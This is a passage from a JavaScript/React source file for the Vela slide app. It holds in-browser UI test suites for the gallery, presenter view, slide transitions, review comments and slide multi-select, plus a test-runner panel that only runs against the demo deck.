      return monos.length > 0;
    }, 2000);
  }},
  { name: "Gallery has thumbnail cards", fn: async () => {
    // Should have multiple clickable card divs with slide titles
    const cards = _$$("[style*='width: 224px'], [style*='width:224px']");
    return cards.length > 0 || _$$("div").filter(d => d.style?.width === "224px").length > 0;
  }},
  { name: "Current slide highlighted", fn: async () => {
    // Look for a card with accent border
    const highlighted = _$$("div").find(d => d.style?.borderColor && d.style.borderColor.includes("59, 130, 246"));
    return !!highlighted;
  }},
  { name: "Hint text visible", fn: async () => {
    await _waitFor(() => _$text("G or ESC to close"), 1000);
  }},
  { name: "Click card navigates", fn: async () => {
    const nums = _$$("span").filter(s => /^\d+$/.test(s.textContent?.trim()) && s.style?.fontFamily?.includes("mono"));
    const card2 = nums.find(n => n.textContent?.trim() === "2");
    if (card2) {
      const cardEl = card2.closest("div[style*='cursor: pointer'], div[style*='cursor:pointer']");
      if (cardEl) _click(cardEl);
    }
    await _wait(400);
    return !_$text("GALLERY");
  }},
  { name: "G key toggles gallery off", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    // Ensure we're not in gallery from a previous test
    if (_$text("GALLERY")) { _key("g"); await _waitFor(() => !_$text("GALLERY"), 1500).catch(() => {}); }
    document.activeElement?.blur(); await _wait(100);
    _key("g");
    await _waitFor(() => _$text("GALLERY"), 3000);
    document.activeElement?.blur(); await _wait(100);
    _key("g");
    await _waitFor(() => !_$text("GALLERY"), 3000);
  }},
  { name: "Exit fullscreen after gallery tests", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"));
  }},
]);

// ── CR-12: Gallery reachable from the editor (not just Present mode) ──
uiSuite("Gallery From Editor", [
  { name: "Editor is not in fullscreen/Present", fn: async () => {
    await _waitFor(() => _$("header"), 2000);
  }},
  { name: "Overview button visible in the SLIDE TOOLBAR", fn: async () => {
    await _waitFor(() => _$("[data-testid='editor-gallery-toggle']"), 2000);
  }},
  { name: "Clicking Overview opens the gallery grid with tiles", fn: async () => {
    const btn = _$("[data-testid='editor-gallery-toggle']");
    if (!btn) throw new Error("editor-gallery-toggle not found");
    _click(btn);
    await _waitFor(() => _$text("GALLERY"), 2000);
    // Scope to the gallery overlay itself — the editor's module list (still
    // mounted behind the overlay) has its own numbered mono-font badges that
    // would otherwise collide with an unscoped document-wide query.
    const root = _$("[data-teacher-panel]");
    if (!root) throw new Error("gallery overlay root not found");
    const cardCount = _$$("span", root).filter((s) => /^\d+$/.test(s.textContent?.trim()) && s.style?.fontFamily?.includes("mono")).length;
    if (cardCount === 0) throw new Error("gallery opened from editor but shows no slide tiles");
  }},
  { name: "Clicking a tile from the editor-opened gallery navigates", fn: async () => {
    const root = _$("[data-teacher-panel]");
    if (!root) throw new Error("gallery overlay root not found");
    const nums = _$$("span", root).filter((s) => /^\d+$/.test(s.textContent?.trim()) && s.style?.fontFamily?.includes("mono"));
    const card1 = nums.find((n) => n.textContent?.trim() === "1");
    if (!card1) throw new Error("tile '1' not found in gallery overlay");
    const cardEl = card1.closest("div[style*='cursor: pointer'], div[style*='cursor:pointer']");
    if (!cardEl) throw new Error("clickable card wrapper not found for tile '1'");
    _click(cardEl);
    await _wait(400);
    if (_$text("GALLERY")) throw new Error("gallery still open after selecting a tile");
    await _waitFor(() => _$("header"), 2000); // back in the editor, not fullscreen
  }},
  { name: "G key re-opens and Escape closes gallery from the editor", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    if (_$text("GALLERY")) { _key("g"); await _wait(400); } // ensure closed from a prior test
    document.activeElement?.blur(); await _wait(100);
    _key("g");
    await _waitFor(() => _$text("GALLERY"), 2000);
    _key("Escape");
    await _waitFor(() => !_$text("GALLERY"), 2000);
  }},
]);

// ── CR-08: Dedicated presenter/speaker view ──────────────────────────
uiSuite("Presenter View", [
  { name: "Enter fullscreen (Present) for presenter-view tests", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => !_$("header"), 2000);
  }},
  { name: "🖥️ presenter-view button visible in Present mode", fn: async () => {
    await _waitFor(() => _$("[data-testid='presenter-toggle']"), 2000);
  }},
  { name: "S key opens presenter view: current + Next + notes + timer", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("s");
    await _waitFor(() => _$("[data-testid='presenter-view']"), 2000);
    const timerEl = _$("[data-testid='presenter-timer']");
    if (!timerEl) throw new Error("presenter-timer not found");
    if (!/\d+:\d\d/.test(timerEl.textContent || "")) throw new Error("presenter timer text does not match mm:ss: " + timerEl.textContent);
    if (!_$("[data-testid='presenter-next']")) throw new Error("Next-slide preview region not found");
    if (!_$("[data-testid='presenter-notes']")) throw new Error("Speaker notes region not found");
  }},
  { name: "Timer keeps advancing (elapsed clock is live)", fn: async () => {
    const before = _$("[data-testid='presenter-timer']")?.textContent;
    await _wait(1200);
    const after = _$("[data-testid='presenter-timer']")?.textContent;
    if (before == null || after == null) throw new Error("presenter-timer disappeared");
    // Not a hard equality check (1s tick can be flaky under load) — just confirm it's still a valid mm:ss.
    if (!/\d+:\d\d/.test(after)) throw new Error("presenter timer stopped showing mm:ss: " + after);
  }},
  { name: "Arrow key advances the deck while presenter view is open", fn: async () => {
    const before = _slidePos();
    _key("ArrowRight"); await _wait(400);
    const after = _slidePos();
    if (before != null && after != null && after === before) throw new Error("ArrowRight did not advance slide with presenter view open");
  }},
  { name: "Presenter toggle button closes the view", fn: async () => {
    const btn = _$("[data-testid='presenter-toggle']");
    if (!btn) throw new Error("presenter-toggle not found");
    _click(btn);
    await _waitFor(() => !_$("[data-testid='presenter-view']"), 2000);
  }},
  { name: "Exit fullscreen after presenter-view tests", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"));
  }},
]);

// ── CR-09: Deck-level slide transition on advance ────────────────────
uiSuite("Slide Transitions", [
  { name: "Enter fullscreen for transition tests", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => !_$("header"), 2000);
  }},
  { name: "slide-transition-fade wrapper present on the active slide", fn: async () => {
    await _waitFor(() => _$(".slide-transition-fade"), 2000);
  }},
  { name: "Transition wrapper remounts (fresh play) on slide advance", fn: async () => {
    const before = _$(".slide-transition-fade");
    if (!before) throw new Error("no .slide-transition-fade element before advancing");
    _key("ArrowRight");
    await _waitFor(() => {
      const el = _$(".slide-transition-fade");
      return el && el !== before;
    }, 2000);
  }},
  { name: "Per-block stagger (.stg-N) still present alongside the deck transition", fn: async () => {
    await _waitFor(() => _$$("[class^='stg-']").length > 0, 2000);
  }},
  { name: "Exit fullscreen after transition tests", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"));
  }},
]);

// ── Review / Comments Suite ─────────────────────────────────────────
// Review mode exposes no button-state signal — the header "💬 Comments" button
// keeps its emoji whether review is on or off — so detect actual state from the
// COMMENTS panel and toggle only when needed. Keeps the Review tests order-robust
// so a prior test's residual mode can't flip the next test's toggle.
const _reviewPanelOpen = () => !!_$text("COMMENTS");
const _reviewToggleBtn = () => _$$("button").find((b) => (b.textContent || "").includes("Comments") && (b.textContent || "").includes("💬"));
const _setReviewMode = async (on) => {
  if (_reviewPanelOpen() === on) return;
  const btn = _reviewToggleBtn();
  if (btn) { _click(btn); await _waitFor(() => _reviewPanelOpen() === on, 1500).catch(() => {}); }
};

uiSuite("Review", [
  { name: "Review button visible in header", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("Comments")));
  }},
  { name: "Review button toggles review mode", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    const btn = _$$("button").find((b) => (b.textContent || "").includes("Comments") && (b.textContent || "").includes("💬"));
    if (!btn) throw new Error("Review button not found");
    _click(btn); await _wait(300);
    // Comments panel should open — look for COMMENTS header
    const panel = await _waitFor(() => _$text("COMMENTS"), 2000).catch(() => null);
    if (!panel) throw new Error("Comments panel did not open");
  }},
  { name: "Comments panel shows filter tabs", fn: async () => {
    await _waitFor(() => {
      const all = document.body.textContent || "";
      return all.includes("Open") && all.includes("Done");
    }, 1000);
  }},
  { name: "Comments panel has Copy for Agent button", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("Copy for Agent")));
  }},
  { name: "Comments panel has Resolve All button", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("Resolve All")));
  }},
  { name: "Comments panel has Clear Done button", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("Clear Done")));
  }},
  { name: "Module comment icon visible in review mode (💬)", fn: async () => {
    // 💬 module icon only shows in review mode — ensure review is actually on
    // (independent of whatever state a prior test left behind).
    await _setReviewMode(true);
    await _waitFor(() => _$$("span").find((s) => s.textContent?.includes("💬") && s.style?.cursor === "pointer"), 1000);
    // Return to editor mode for the following tests.
    await _setReviewMode(false);
  }},
  { name: "Module comment icon hidden in editor mode", fn: async () => {
    // In editor mode (review off), 💬 toggle should NOT be in the module list
    await _wait(200);
    const commentIcon = _$$("span").find((s) => s.textContent?.includes("💬") && s.style?.cursor === "pointer" && !s.closest("button"));
    if (commentIcon) throw new Error("💬 icon should be hidden in editor mode");
  }},
  { name: "Review mode exit closes panel", fn: async () => {
    const btn = _$$("button").find((b) => (b.textContent || "").includes("Comments") && (b.textContent || "").includes("💬"));
    if (!btn) throw new Error("Review button not found");
    _click(btn); await _wait(300);
    // Panel should be gone
    await _wait(200);
    const panel = _$text("COMMENTS");
    // May still be visible briefly — just verify no crash
  }},
  { name: "R key toggles review mode", fn: async () => {
    // Start from a known-off state so the first `r` deterministically opens.
    await _setReviewMode(false);
    document.activeElement?.blur(); await _wait(100);
    _key("r");
    const panel = await _waitFor(() => _$text("COMMENTS"), 2000).catch(() => null);
    if (!panel) throw new Error("R key did not open comments panel");
    // Toggle off
    _key("r");
    await _waitFor(() => !_$text("COMMENTS"), 1500).catch(() => {});
  }},
  { name: "Review mode and Vera are mutually exclusive", fn: async () => {
    // Open review (only if not already on — the button emoji isn't a state signal)
    await _setReviewMode(true);
    // Now open Vera — should close review
    const veraBtn = _$$("button").find((b) => (b.textContent || "").includes("Vera") && (b.textContent || "").includes("🤖"));
    if (veraBtn) { _click(veraBtn); await _waitFor(() => !!(_$$("textarea").find((t) => { const ph = t.placeholder?.toLowerCase() || ""; return ph.includes("tell vera") || ph.includes("paste images"); }) || _$$("span").find((s) => s.textContent?.trim() === "VERA")), 1500).catch(() => {}); }
    // Vera open? Use the same robust signal as the Chat suite — the textarea
    // placeholder is AI-state dependent (keyless builds show "AI features not
    // enabled"), so accept the "VERA" panel header as the open signal too.
    const veraOpen = !!(_$$("textarea").find((t) => {
      const ph = t.placeholder?.toLowerCase() || "";
      return ph.includes("tell vera") || ph.includes("paste images");
    }) || _$$("span").find((s) => s.textContent?.trim() === "VERA"));
    // Mutual exclusion: opening Vera must have closed the review (COMMENTS) panel.
    const reviewClosed = !_reviewPanelOpen();
    // Close Vera
    if (veraBtn) { _click(veraBtn); await _wait(200); }
    if (!veraOpen) throw new Error("Vera panel didn't open when switching from Review");
    if (!reviewClosed) throw new Error("Review panel stayed open — not mutually exclusive with Vera");
  }},
  { name: "Comment badge click opens comments panel", fn: async () => {
    // Ensure review mode is off first
    document.activeElement?.blur(); await _wait(100);
    // Look for the amber comment count badge on the slide canvas (top-right circle)
    const badge = _$$("div").find((d) => d.style?.borderRadius === "11px" && d.style?.background && d.style?.cursor === "pointer" && d.style?.position === "absolute");
    if (badge) {
      _click(badge);
      const panel = await _waitFor(() => _$text("COMMENTS"), 2000).catch(() => null);
      if (!panel) throw new Error("Clicking comment badge did not open comments panel");
      // Close review mode
      const reviewBtn = _$$("button").find((b) => (b.textContent || "").includes("Comments") && (b.textContent || "").includes("💬"));
      if (reviewBtn) { _click(reviewBtn); await _wait(300); }
    }
    // If no badge, test passes (no comments on current slide)
  }},
], { setup: _selectFirstModule });

// ── Sprint 7-1 UX batch ──────────────────────────────────────────────
// Header slide count parsed from the header stat pill ("⏱24m · 28sl · 13§").
const _headerSlideCount = () => {
  const hdr = _$("header");
  if (!hdr) return null;
  const el = _$$("span", hdr).find((e) => /\d+sl\b/.test(e.textContent || ""));
  const m = el && (el.textContent || "").match(/(\d+)sl/);
  return m ? parseInt(m[1], 10) : null;
};

uiSuite("Header & Stats (7-1)", [
  { name: "Header shows minutes + slide count", fn: async () => {
    const pill = await _waitFor(() => { const h = _$("header"); return h && _$$("span", h).find((e) => /\d+m\b/.test(e.textContent || "") && /\d+sl\b/.test(e.textContent || "")); });
    if (/\d+m\s*\d+s/.test(pill.textContent)) throw new Error("header still shows seconds: " + pill.textContent);
  }},
  { name: "Header pill opens the Deck stats dialog", fn: async () => {
    const pill = await _waitFor(() => { const h = _$("header"); return h && _$$("span", h).find((e) => /\d+sl\b/.test(e.textContent || "") && /§/.test(e.textContent || "")); });
    _click(pill);
    await _waitFor(() => _$$("*").find((e) => e.children.length === 0 && /Deck stats/i.test(e.textContent || "")));
    _key("Escape");
    await _wait(150);
  }},
]);

uiSuite("Hide slides (7-1)", [
  { name: "Eye toggle hides a slide and updates the count", fn: async () => {
    const eye = await _waitFor(() => _$$("span").find((e) => (e.title || "").startsWith("Hide slide")));
    const before = _headerSlideCount();
    if (before == null) throw new Error("no header slide count");
    _click(eye);
    await _waitFor(() => _headerSlideCount() === before - 1, 2000);
    // restore
    const unhide = await _waitFor(() => _$$("span").find((e) => (e.title || "").startsWith("Hidden")));
    _click(unhide);
    await _waitFor(() => _headerSlideCount() === before, 2000);
  }},
]);

uiSuite("Add menu (7-1)", [
  { name: "Add affordance offers Blank / AI / Section", fn: async () => {
    const add = await _waitFor(() => _$$("*").find((e) => e.children.length === 0 && /＋\s*add|＋\s*Add slide/.test(e.textContent || "")));
    _click(add);
    await _waitFor(() => {
      const btns = _$$("button").map((b) => (b.textContent || "").trim());
      return btns.some((t) => /Blank/.test(t)) && btns.some((t) => /Section/.test(t)) && btns.some((t) => /AI/.test(t));
    }, 2000);
    // close the menu
    const x = _$$("button").find((b) => (b.textContent || "").trim() === "✕");
    if (x) _click(x);
    await _wait(120);
  }},
]);

uiSuite("Section drag reorder (7-1)", [
  { name: "Dragging a section changes the order", fn: async () => {
    const rows = () => _$$(".concept-row");
    const titleOf = (r) => { const s = _$$("span", r).find((x) => parseInt(x.style.fontWeight) >= 600); return (s ? s.textContent : r.textContent || "").trim().slice(0, 30); };
    const before = rows().map(titleOf);
    if (before.length < 3) throw new Error("need >=3 sections");
    const src = rows()[0], dst = rows()[2];
    const dt = new DataTransfer();
    const fire = (el, type, extra) => el.dispatchEvent(new DragEvent(type, Object.assign({ bubbles: true, cancelable: true, dataTransfer: dt }, extra)));
    const db = dst.getBoundingClientRect();
    fire(src, "dragstart");
    fire(dst, "dragover", { clientX: db.x + db.width / 2, clientY: db.y + db.height - 3 });
    fire(dst, "drop", { clientX: db.x + db.width / 2, clientY: db.y + db.height - 3 });
    fire(src, "dragend");
    await _waitFor(() => JSON.stringify(rows().map(titleOf)) !== JSON.stringify(before), 2000);
    // drag it back to restore original order
    const r2 = rows(); const s2 = r2.find((r) => titleOf(r) === before[0]); const d2 = r2[0];
    if (s2 && d2 && s2 !== d2) {
      const dt2 = new DataTransfer();
      const fire2 = (el, type, extra) => el.dispatchEvent(new DragEvent(type, Object.assign({ bubbles: true, cancelable: true, dataTransfer: dt2 }, extra)));
      const b2 = d2.getBoundingClientRect();
      fire2(s2, "dragstart"); fire2(d2, "dragover", { clientX: b2.x + 5, clientY: b2.y + 2 }); fire2(d2, "drop", { clientX: b2.x + 5, clientY: b2.y + 2 }); fire2(s2, "dragend");
      await _wait(150);
    }
  }},
]);

uiSuite("Section collapse-all (Ctrl-click) — v13.15", [
  { name: "Ctrl-click collapses/expands every section, plain click affects only one", fn: async () => {
    const rows = () => _$$(".concept-row");
    // The collapse arrow is the row's first <span> (rendered before the imp-dot
    // div and title), identifiable by its rotate() transform.
    const toggles = () => rows().map((r) => r.querySelector("span"));
    const isCollapsed = (span) => /rotate\(-90deg\)/.test(span.style.transform || "");
    if (rows().length < 2) throw new Error("need >=2 sections");
    // Plain click collapses only the clicked section.
    _click(toggles()[0]);
    await _wait(150);
    let states = toggles().map(isCollapsed);
    if (!states[0]) throw new Error("plain click did not collapse the clicked section");
    if (states.slice(1).some(Boolean)) throw new Error("plain click affected other sections");
    _click(toggles()[0]); // restore
    await _wait(150);
    // Ctrl-click collapses ALL sections.
    _clickMod(toggles()[0], { ctrlKey: true });
    await _wait(150);
    states = toggles().map(isCollapsed);
    if (!states.every(Boolean)) throw new Error("ctrl-click did not collapse all sections");
    // Ctrl-click again expands ALL sections.
    _clickMod(toggles()[0], { ctrlKey: true });
    await _wait(150);
    states = toggles().map(isCollapsed);
    if (states.some(Boolean)) throw new Error("ctrl-click did not expand all sections");
  }},
]);

uiSuite("Presenter Ctrl+E (7-1)", [
  { name: "Ctrl+E toggles the TOC search pane", fn: async () => {
    try { document.activeElement?.blur?.(); } catch {}
    const isFs = () => !!_$("[style*='position: fixed']");
    // Ensure we are IN fullscreen (a prior suite may have left it toggled either way).
    for (let i = 0; i < 3 && !isFs(); i++) { _key("f"); await _waitFor(isFs, 1200).catch(() => {}); }
    if (!isFs()) throw new Error("could not enter fullscreen");
    const tocOpen = () => { const i = _$$("input").find((x) => /search slides/i.test(x.placeholder || "")); return i && i.getBoundingClientRect().x > -50; };
    _key("e", { ctrlKey: true });
    await _waitFor(tocOpen, 2500);
    _key("e", { ctrlKey: true });
    await _waitFor(() => !tocOpen(), 2500);
    _key("Escape"); await _wait(300); if (isFs()) { _key("Escape"); await _wait(200); }
  }},
]);

// ── Multi-select / Context menu / Move picker (Features 4–6) ──────────
// Dispatch a native click carrying keyboard modifiers (React onClick reads them).
const _clickMod = (el, opts = {}) => {
  if (!el) throw new Error("clickMod: element not found");
  el.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, ...opts }));
  return el;
};
const _rightClick = (el, x = 120, y = 120) => {
  if (!el) throw new Error("rightClick: element not found");
  el.dispatchEvent(new MouseEvent("contextmenu", { bubbles: true, cancelable: true, clientX: x, clientY: y }));
  return el;
};
const _tocRows = () => _$$('[data-testid="toc-slide-row"]');
// A prior suite may leave the app in Vela fullscreen (a fixed inset:0 overlay at
// a high z-index showing the "N / N" slide counter). Toggle out with 'f' so the
// editor's SlidePanel toolbar actually renders for these suites.
const _exitFullscreen = async () => {
  const inFs = () => _$$("div").some((d) => d.style.position === "fixed" && d.style.inset === "0px" && parseInt(d.style.zIndex || "0", 10) >= 999 && /\d+\s*\/\s*\d+/.test(d.textContent || ""));
  for (let i = 0; i < 3 && inFs(); i++) { document.activeElement?.blur?.(); _key("f"); await _waitFor(() => !inFs(), 1500).catch(() => {}); }
};
const _editorSetup = async () => { await _exitFullscreen(); await _selectFirstModule(); };

uiSuite("Slide Multi-select (F4)", [
  { name: "cmd-click selects multiple slide rows", fn: async () => {
    const rows = _tocRows();
    if (rows.length < 2) { return; } // module with <2 slides — soft pass
    _click(rows[0]); await _wait(120);
    _clickMod(rows[1], { metaKey: true }); await _wait(150);
    const selCount = _tocRows().filter((r) => r.getAttribute("data-selected") === "true").length;
    if (selCount < 2) throw new Error("expected >=2 rows data-selected, got " + selCount);
    // plain click collapses back to a single selection
    _click(rows[0]); await _wait(150);
    const after = _tocRows().filter((r) => r.getAttribute("data-selected") === "true").length;
    if (after > 1) throw new Error("plain click did not clear multi-selection, got " + after);
  }},
  { name: "shift-click selects a contiguous range", fn: async () => {
    const rows = _tocRows();
    if (rows.length < 3) { return; }
    _click(rows[0]); await _wait(120);
    _clickMod(rows[2], { shiftKey: true }); await _wait(150);
    const selCount = _tocRows().filter((r) => r.getAttribute("data-selected") === "true").length;
    if (selCount < 3) throw new Error("shift-range expected >=3 selected, got " + selCount);
    _click(rows[0]); await _wait(120);
  }},
], { setup: _editorSetup });

uiSuite("Slide Context Menu (F5)", [
  { name: "right-click opens the slide context menu", fn: async () => {
    const rows = _tocRows();
    if (rows.length === 0) throw new Error("no slide rows");
    _rightClick(rows[0]);
    const menu = await _waitFor(() => _$('[data-testid="toc-context-menu"]'), 2000);
    for (const tid of ["ctx-move", "ctx-duplicate", "ctx-delete", "ctx-hide"]) {
      if (!menu.querySelector(`[data-testid="${tid}"]`)) throw new Error("missing menu item " + tid);
    }
    _key("Escape");
    await _waitFor(() => !_$('[data-testid="toc-context-menu"]'), 2000);
  }},
  { name: "Move submenu shows the section picker", fn: async () => {
    const rows = _tocRows();
    if (rows.length === 0) throw new Error("no slide rows");
    _rightClick(rows[0]);
    const menu = await _waitFor(() => _$('[data-testid="toc-context-menu"]'), 2000);
    _click(menu.querySelector('[data-testid="ctx-move"]'));
    // section picker (may be empty if only one module) — search input appears
    await _waitFor(() => _$('[data-testid="section-search"]') || _$text("No other sections"), 2000).catch(() => {});
    _key("Escape");
    await _waitFor(() => !_$('[data-testid="toc-context-menu"]'), 2000).catch(() => {});
    document.activeElement?.blur?.();
  }},
], { setup: _editorSetup });

uiSuite("Move Picker Search (F6)", [
  { name: "move picker has search + wide scroll + wheel isolation", fn: async () => {
    // Ensure the slide editor toolbar is on screen (click the active slide row).
    const rows = _tocRows();
    if (rows.length > 0) { _click(rows[0]); await _wait(150); }
    const findMove = () => _$$("button").find((b) => b.title?.includes("Move to module") || (b.textContent?.includes("📦") && /Move/.test(b.textContent || "")));
    const btn = await _waitFor(findMove, 2500);
    _click(btn);
    const search = await _waitFor(() => _$('[data-testid="section-search"]'), 2000).catch(() => null);
    if (!search) { // no other modules — close and soft pass
      const bd = _$$("div").find((d) => d.style.position === "fixed" && d.style.inset === "0px" && d.style.zIndex === "9998");
      if (bd) _click(bd); await _wait(150); return;
    }
    const list = _$('[data-testid="section-picker-list"]');
    if (!list || !list.className.includes("vela-wide-scroll")) throw new Error("picker list missing wide-scroll class");
    if (list.getAttribute("data-scroll-container") == null) throw new Error("picker list not marked data-scroll-container");
    const before = _$$('[data-testid="section-picker-item"]').length;
    _type(search, "zzzznomatch"); await _wait(200);
    const filtered = _$$('[data-testid="section-picker-item"]').length;
    if (before > 0 && filtered !== 0) throw new Error("search did not filter (before " + before + ", after " + filtered + ")");
    _type(search, ""); await _wait(150);
    const bd = _$$("div").find((d) => d.style.position === "fixed" && d.style.inset === "0px" && d.style.zIndex === "9998");
    if (bd) _click(bd); await _wait(150);
  }},
], { setup: _editorSetup });

// ━━━ UI TEST RUNNER COMPONENT ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// Demo deck guard — UI tests only run against the original demo deck
// to avoid mutating user work. Reads live deck title from DOM header.

function computeDeckFingerprint() {
  try {
    // Read LIVE deck title from header (reflects current state, not embedded data)
    const titleEl = _$$("header span").find((s) => {
      const fw = s.style?.fontWeight;
      return (fw === "700" || fw === 700 || fw === "bold") && s.textContent?.length > 1;
    });
    const liveTitle = titleEl?.textContent?.trim() || "";

    // Read slide count from DOM (e.g. "21sl" or slide counter "3 / 8")
    const statsEl = _$$("header span").find((s) => s.textContent?.includes("sl") && s.textContent?.includes("§"));
    let slideCount = 0;
    if (statsEl) {
      const m = statsEl.textContent.match(/(\d+)sl/);
      if (m) slideCount = parseInt(m[1]);
    }

    // Build fingerprint from live DOM state
    if (liveTitle) return `${liveTitle}|${slideCount}`;
    return null;
  } catch { return null; }
}

// Fingerprint: "title|slideCount" — matches demo deck as assembled
const DEMO_DECK_FP_TITLE = "Vela Slides \u2014 Live Demo";

function VelaUITestRunner() {
  const [running, setRunning] = useState(false);
  const [results, setResults] = useState(null);
  const [progress, setProgress] = useState(null);
  const [expanded, setExpanded] = useState(false);
  const [copied, setCopied] = useState(false);
  const [warning, setWarning] = useState(null);
  const [hasRun, setHasRun] = useState(false);

  const run = async (force) => {
    // Fingerprint check — only run against demo deck unless forced
    if (!force) {
      const fp = computeDeckFingerprint();
      const isDemo = fp && fp.startsWith(DEMO_DECK_FP_TITLE + "|");
      if (!isDemo) {
        setWarning({ fp: fp || "(unable to read deck)", expected: DEMO_DECK_FP_TITLE });
        return;
      }
    }
    setWarning(null);
    setRunning(true);
    setResults(null);
    setExpanded(true);
    const res = await runUITests((p) => setProgress(p));
    setResults(res);
    setRunning(false);
    setProgress(null);
    setHasRun(true);
  };

  // Ctrl+Alt+T or custom event triggers
  useEffect(() => {
    const keyHandler = (e) => {
      if (e.ctrlKey && e.altKey && e.key === "t") {
        e.preventDefault();
        if (!running) run();
      }
    };
    const eventHandler = () => { if (!running) run(); };
    window.addEventListener("keydown", keyHandler);
    window.addEventListener("vela-run-uitests", eventHandler);
    return () => { window.removeEventListener("keydown", keyHandler); window.removeEventListener("vela-run-uitests", eventHandler); };
  }, [running]);

  const copyResults = () => {
    if (!results) return;
    const passed = results.filter((r) => r.pass === true).length;
    const failed = results.filter((r) => r.pass === false).length;
    const skipped = results.filter((r) => r.pass === "skip").length;
    const lines = [
      `⛵ Vela UI Tests — v${VELA_VERSION}`,
      `${passed} passed, ${failed} failed, ${skipped} skipped, ${results.length} total`,
      `${new Date().toISOString()}`,
      "",
      ...results.map((r) => `${r.pass === true ? "✅" : r.pass === "skip" ? "⏭️" : "❌"} [${r.suite}] ${r.name} (${r.ms}ms)${r.error ? ` — ${r.error}` : ""}`),
    ];
    const text = lines.join("\n");
    velaClipboard(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (!results && !running && !warning) {
    // Show mini rerun button if tests have been run before
    if (!hasRun) return null;
    return (
      <div style={{ position: "fixed", bottom: 16, right: 16, zIndex: 99999 }}>
        <button onClick={() => run()} style={{ width: 36, height: 36, borderRadius: "50%", background: "rgba(15,23,42,0.9)", border: "1px solid rgba(99,102,241,0.4)", color: "#818cf8", fontSize: 16, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", boxShadow: "0 4px 16px rgba(0,0,0,0.4)", backdropFilter: "blur(8px)" }} title="Re-run UI Tests (Ctrl+Alt+T)">🧪</button>
      </div>
    );
  }

  // Warning: wrong deck loaded
  if (warning && !running && !results) return (
    <div style={{ position: "fixed", bottom: 16, right: 16, zIndex: 99999, fontFamily: FONT.mono, maxWidth: 380 }}>
      <div style={{ borderRadius: 10, background: "rgba(15,23,42,0.97)", border: "1px solid rgba(251,191,36,0.5)", boxShadow: "0 8px 40px rgba(0,0,0,0.5)", backdropFilter: "blur(12px)", padding: "14px 16px" }}>
        <div style={{ fontSize: 12, fontWeight: 700, color: "#fbbf24", marginBottom: 8, display: "flex", alignItems: "center", gap: 6 }}>
          <span>⚠️</span> UI Tests — Wrong Deck
        </div>
        <div style={{ fontSize: 10, color: "#94a3b8", lineHeight: 1.6, marginBottom: 10 }}>
          UI tests are designed for the demo deck and may modify slides. Current deck doesn't match the expected fingerprint.
        </div>
        <div style={{ fontSize: 8, color: "#475569", marginBottom: 10, wordBreak: "break-all" }}>
          Current: {warning.fp || "(unknown)"}<br />
          Expected title: {warning.expected}
        </div>
        <div style={{ display: "flex", gap: 6 }}>
          <button onClick={() => run(true)} style={{ padding: "5px 12px", fontSize: 10, fontWeight: 700, background: "rgba(251,191,36,0.2)", border: "1px solid rgba(251,191,36,0.4)", borderRadius: 4, color: "#fbbf24", cursor: "pointer" }}>Run anyway</button>
          <button onClick={() => setWarning(null)} style={{ padding: "5px 12px", fontSize: 10, background: "rgba(255,255,255,0.1)", border: "1px solid rgba(255,255,255,0.15)", borderRadius: 4, color: "#94a3b8", cursor: "pointer" }}>Cancel</button>
        </div>
      </div>
    </div>
  );

  const passed = results?.filter((r) => r.pass === true).length || 0;
  const failed = results?.filter((r) => r.pass === false).length || 0;
  const skippedCount = results?.filter((r) => r.pass === "skip").length || 0;
  const total = results?.length || 0;
  const totalMs = results?.reduce((s, r) => s + r.ms, 0) || 0;

  // Group by suite
  const suites = {};
  (results || []).forEach((r) => {
    if (!suites[r.suite]) suites[r.suite] = [];
    suites[r.suite].push(r);
  });

  return (
    <div style={{ position: "fixed", bottom: 16, right: 16, zIndex: 99999, display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 6, fontFamily: FONT.mono, maxWidth: 420 }}>
      {/* Live progress while running */}
      {running && progress && (
        <div style={{ borderRadius: 10, background: "rgba(15,23,42,0.97)", border: "1px solid rgba(59,130,246,0.5)", boxShadow: "0 8px 40px rgba(0,0,0,0.5)", backdropFilter: "blur(12px)", overflow: "hidden", maxWidth: 380, display: "flex", flexDirection: "column" }}>
          {/* Progress header */}
          <div style={{ padding: "10px 14px", display: "flex", alignItems: "center", gap: 8, borderBottom: "1px solid rgba(255,255,255,0.1)" }}>
            <span style={{ animation: "spin 1s linear infinite", display: "inline-block", fontSize: 14 }}>🧪</span>
            <span style={{ fontSize: 12, fontWeight: 700, color: "#fff" }}>{progress.done}/{progress.total}</span>
            <span style={{ fontSize: 10, color: "#34d399", fontWeight: 600 }}>✓ {progress.passed || 0}</span>
            {(progress.failed || 0) > 0 && <span style={{ fontSize: 10, color: "#f87171", fontWeight: 600 }}>✗ {progress.failed}</span>}
            {(progress.skipped || 0) > 0 && <span style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600 }}>⏭️ {progress.skipped}</span>}
            <div style={{ flex: 1 }} />
            <span style={{ fontSize: 9, color: "rgba(255,255,255,0.4)" }}>{Math.round((progress.done / progress.total) * 100)}%</span>
          </div>
          {/* Progress bar */}
          <div style={{ height: 3, background: "rgba(255,255,255,0.1)" }}>
            <div style={{ height: "100%", background: (progress.failed || 0) > 0 ? "#f87171" : "#3b82f6", width: `${(progress.done / progress.total) * 100}%`, transition: "width 0.15s" }} />
          </div>
          {/* Current test */}
          <div style={{ padding: "6px 14px", fontSize: 10, color: "rgba(255,255,255,0.6)" }}>
            {progress.suite} → {progress.test}
          </div>
          {/* Live failures */}
          {progress.results && progress.results.filter((r) => r.pass === false).length > 0 && (
